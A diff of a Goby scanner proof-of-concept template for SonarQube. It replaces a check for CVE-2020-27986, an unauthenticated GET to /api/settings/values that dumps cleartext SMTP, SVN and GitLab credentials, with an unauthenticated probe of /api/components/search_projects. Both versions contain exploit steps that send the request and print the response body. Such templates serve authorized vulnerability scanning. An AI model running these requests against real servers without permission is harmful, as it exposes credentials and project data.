@@ -1,18 +1,16 @@
 {
-      "Name": "SonarQube unauth CVE-2020-27986",
+      "Name": "SonarQube search_projects information",
       "Level": "3",
-      "Tags": [
-            "unauth"
-      ],
+      "Tags": [],
       "GobyQuery": "app=\"SonarQube-code management\"",
-      "Description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP, SVN, and GitLab credentials via the api/settings/values URI.",
-      "Product": "SonarQube",
-      "Homepage": "https://www.sonarqube.org/",
-      "Author": "aetkrad",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
       "Impact": "",
       "Recommendation": "",
       "References": [
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27986"
+            "https://gobies.org/"
       ],
       "HasExp": true,
       "ExpParams": null,
@@ -25,51 +23,7 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/api/settings/values",
-                        "follow_redirect": false,
-                        "header": null,
-                        "data_type": "text",
-                        "data": "",
-                        "set_variable": []
-                  },
-                  "ResponseTest": {
-                        "type": "group",
-                        "operation": "AND",
-                        "checks": [
-                              {
-                                    "type": "item",
-                                    "variable": "$code",
-                                    "operation": "==",
-                                    "value": "200",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "sonaranalyzer-cs.nuget.packageVersion",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "sonar.core.id",
-                                    "bz": ""
-                              }
-                        ]
-                  },
-                  "SetVariable": [
-                        "output|lastbody|regex|"
-                  ]
-            }
-      ],
-      "ExploitSteps": [
-            "AND",
-            {
-                  "Request": {
-                        "method": "GET",
-                        "uri": "/api/settings/values",
+                        "uri": "/api/components/search_projects",
                         "follow_redirect": true,
                         "header": null,
                         "data_type": "text",
@@ -91,14 +45,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "sonaranalyzer-cs.nuget.packageVersion",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "sonar.core.id",
+                                    "value": "paging",
                                     "bz": ""
                               }
                         ]
@@ -108,6 +55,43 @@
                   ]
             }
       ],
-      "PostTime": "2022-06-25 20:10:24",
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/api/components/search_projects",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "paging",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2022-06-25 20:10:45",
       "GobyVersion": "1.9.323"
 }
